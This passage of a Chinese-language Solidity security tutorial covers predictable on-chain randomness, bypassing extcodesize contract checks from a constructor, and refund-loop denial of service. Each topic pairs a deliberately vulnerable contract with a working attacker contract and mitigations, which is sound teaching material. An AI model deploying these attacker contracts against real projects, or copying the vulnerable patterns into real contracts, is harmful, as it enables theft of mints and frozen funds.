+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">uint</span> <span class="n">nonce</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">nonceMint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">signature</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes32</span> <span class="n">_msgHash</span> <span class="o">=</span> <span class="n">toEthSignedMessageHash</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="nb">block</span><span class="p">.</span><span class="nb">chainid</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">verify</span><span class="p">(</span><span class="n">_msgHash</span><span class="p">,</span> <span class="n">signature</span><span class="p">),</span> <span class="s">&#34;Invalid Signer!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_mint</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">nonce</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="623对签名的长度进行校验">6.2.3.对签名的长度进行校验</h3>
+<p>签名的长度为65个字节，在操作之前进行校验处理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">mint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">signature</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">signature</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">65</span><span class="p">,</span> <span class="s">&#34;Invalid signature length&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="7伪随机数">7.伪随机数</h1>
+<p>很多以太坊上的应用都需要用到随机数，例如<code>NFT</code>随机抽取<code>tokenId</code>、抽盲盒、<code>gamefi</code>战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明且确定性的，它没有其他编程语言一样给开发者提供生成随机数的方法</p>
+<p>有的项目方不得不采用链上的一些信息来生成一些<code>伪随机数</code>，比如使用<code>keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))</code>，因为<code>block</code>的数据都是确定的，导致这些随机数可以准确的算出来，这就有机可乘</p>
+<h2 id="71攻击方式">7.1.攻击方式</h2>
+<p>如以下合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">BadRandomness</span> <span class="k">is</span> <span class="n">ERC721</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">totalSupply</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 构造函数，初始化NFT合集的名称、代号
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">constructor</span><span class="p">()</span> <span class="n">ERC721</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">){}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 铸造函数：当输入的 luckyNumber 等于随机数时才能mint
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">luckyMint</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">luckyNumber</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">randomNumber</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="nb">blockhash</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">)))</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span> <span class="c1">// get bad random number
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="n">randomNumber</span> <span class="o">==</span> <span class="n">luckyNumber</span><span class="p">,</span> <span class="s">&#34;Better luck next time!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">totalSupply</span><span class="p">);</span> <span class="c1">// mint
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">totalSupply</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>它会通过链上的信息生成一个随机数，<code>uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100</code>。如果传入的<code>luckyNumber</code>与该随机数相等，那么就会<code>_mint</code>。实际上这就是个抽奖空投的例子</p>
+<p>但是生成的随机数是可以准确预测的，比如以下攻击者合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attack</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">attackMint</span><span class="p">(</span><span class="n">BadRandomness</span> <span class="n">nftAddr</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 提前计算随机数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">luckyNumber</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="nb">blockhash</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 利用 luckyNumber 攻击
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">nftAddr</span><span class="p">.</span><span class="n">luckyMint</span><span class="p">(</span><span class="n">luckyNumber</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于<code>attackMint()</code>和<code>luckyMint()</code>将在同一个区块中调用，<code>blockhash</code>和<code>block.timestamp</code>是相同的，利用他们生成的随机数也相同。这样提前算出随机数并且传给<code>luckyMint</code>，那么每次<code>_mint</code>都会有效</p>
+<h2 id="72预防方式">7.2.预防方式</h2>
+<p>使用预言机，在链下生成随机数，然后上传到链上，从而保证随机数不可预测，比如<a href="https://docs.chain.link/vrf#overview" target="_blank" rel="noopener noreffer">Chainlink VRF</a></p>
+<h1 id="8绕过合约长度检查">8.绕过合约长度检查</h1>
+<p>很多空投项目在<code>mint</code>前会去调用<code>isContract</code>检查<code>mint address</code>是否是钱包而非合约，这样做主要是规避参与空投的人员使用合约手段快速、大量的<code>mint</code>。具体代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// 利用 extcodesize 检查是否为合约
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nf">isContract</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// extcodesize &gt; 0 的地址一定是合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 但是合约在构造函数时候 extcodesize 为0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint</span> <span class="n">size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">assembly</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">size</span> <span class="o">:=</span> <span class="nf">extcodesize</span><span class="p">(</span><span class="n">account</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">return</span> <span class="n">size</span> <span class="err">&gt;</span> <span class="mi">0</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="81攻击方式">8.1.攻击方式</h2>
+<p>有以下合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// 用extcodesize检查是否为合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">contract</span> <span class="nc">ContractCheck</span> <span class="k">is</span> <span class="n">ERC20</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 构造函数：初始化代币名称和代号
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">constructor</span><span class="p">()</span> <span class="n">ERC20</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">)</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// 利用 extcodesize 检查是否为合约
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">isContract</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// extcodesize &gt; 0 的地址一定是合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// 但是合约在构造函数时候 extcodesize 为0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint</span> <span class="n">size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">assembly</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">size</span> <span class="o">:=</span> <span class="nf">extcodesize</span><span class="p">(</span><span class="n">account</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">return</span> <span class="n">size</span> <span class="err">&gt;</span> <span class="mi">0</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// mint函数，只有非合约地址能调用（有漏洞）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">mint</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">isContract</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">),</span> <span class="s">&#34;Contract not allowed!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该合约在<code>mint</code>时，会去调用<code>isContract</code>对地址进行校验看是否为钱包地址。但是合约有个特性，在合约的构造函数时，<code>extcodesize</code>为0，那么攻击者就可以在合约的构造函数里发起操作，绕过<code>isContract</code>。比如以下攻击合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// 利用构造函数的特点攻击
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">contract</span> <span class="nc">NotContract</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="k">public</span> <span class="n">isContract</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">contractCheck</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">contractCheck</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">isContract</span> <span class="o">=</span> <span class="n">ContractCheck</span><span class="p">(</span><span class="n">addr</span><span class="p">).</span><span class="n">isContract</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// This will work
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span><span class="p">(</span><span class="kt">uint</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ContractCheck</span><span class="p">(</span><span class="n">addr</span><span class="p">).</span><span class="n">mint</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 合约创建好以后，extcodesize &gt; 0，isContract() 可以检测
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">mint</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ContractCheck</span><span class="p">(</span><span class="n">contractCheck</span><span class="p">).</span><span class="n">mint</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>constructor</code>中，此时<code>extcodesize</code>为0，可以直接绕过<code>ContractCheck</code>中的检查，直接mint，造成项目方的损失</p>
+<h2 id="82预防方式">8.2.预防方式</h2>
+<p>可以使用<code>tx.origin == msg.sender</code>来验证交易是否来自外部账户(EOA)而非合约。但在<a href="https://eips.ethereum.org/EIPS/eip-3074" target="_blank" rel="noopener noreffer">eip-3074</a>中，可以让合约代表钱包发送交易，此时<code>tx.origin == msg.sender</code>就会判断为true，哪怕它是合约发起的，验证就会失效</p>
+<h1 id="9拒绝服务">9.拒绝服务</h1>
+<p>拒绝服务攻击(Denial of Service)也叫做<code>DoS</code>攻击，在 web2 中，拒绝服务攻击（DoS）是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象。而在 web3，它指的是利用漏洞使得智能合约无法正常提供服务</p>
+<h2 id="91攻击方式">9.1.攻击方式</h2>
+<p>以下有个示例合约，这个合约逻辑很简单，游戏开始时，玩家们调用 <code>deposit()</code> 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，<code>refund()</code>函数被调用，将 ETH 依次退款给所有玩家</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">contract</span> <span class="nc">DoSGame</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="k">public</span> <span class="n">refundFinished</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balanceOf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span><span class="p">[]</span> <span class="k">public</span> <span class="n">players</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 所有玩家存ETH到合约里
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">refundFinished</span><span class="p">,</span> <span class="s">&#34;Game Over&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Please donate ETH&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 记录存款
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 记录玩家地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">players</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 游戏结束，退款开始，所有玩家将依次收到退款
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">refund</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">refundFinished</span><span class="p">,</span> <span class="s">&#34;Game Over&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">pLength</span> <span class="o">=</span> <span class="n">players</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 通过循环给所有玩家退款
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pLength</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span> <span class="n">player</span> <span class="o">=</span> <span class="n">players</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">refundETH</span> <span class="o">=</span> <span class="n">balanceOf</span><span class="p">[</span><span class="n">player</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">player</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">refundETH</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Refund Fail!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">balanceOf</span><span class="p">[</span><span class="n">player</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">refundFinished</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balance</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个合约的漏洞就在于退款时，使用的<code>(bool success, ) = player.call{value: refundETH}(&quot;&quot;)</code>，当接收方是一个合约的时候，合约开发者一旦在<code>receive/fallback</code>里面增加恶意代码，那就会造成所有退款将不能正常进行，资金被锁在合约中</p>
+<p>比如以下攻击者的代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Attack</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 退款时进行DoS攻击
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">revert</span><span class="p">(</span><span class="s">&#34;DoS Attack!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 参与DoS游戏并存款
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">(</span><span class="kt">address</span> <span class="n">gameAddr</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">DoSGame</span> <span class="n">dos</span> <span class="o">=</span> <span class="n">DoSGame</span><span class="p">(</span><span class="n">gameAddr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dos</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这有点<strong>重入攻击的味道</strong></p>
+<h2 id="92预防方式">9.2.预防方式</h2>
+<ol>
+<li>外部合约的函数调用（例如 <code>call</code>）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 <code>require(success, &quot;Refund Fail!&quot;);</code> 去掉，退款在单个地址失败时仍能继续运行</li>
+<li>合约不会出乎意料的自毁</li>
+<li>合约不会进入无限循环</li>
+<li><code>require</code> 和 <code>assert</code> 的参数设定正确</li>
